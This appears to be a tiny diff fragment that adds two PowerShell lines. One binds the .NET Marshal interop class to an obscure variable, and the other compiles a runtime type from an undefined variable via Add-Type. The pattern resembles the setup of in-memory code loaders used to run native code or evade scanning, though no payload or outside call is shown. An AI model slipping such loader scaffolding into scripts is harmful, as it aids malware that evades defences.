@@ -1,0 +1,2 @@
+$7amada = [System.Runtime.InteropServices.Marshal]
+Add-Type -TypeDefinition $afrcv -passthru
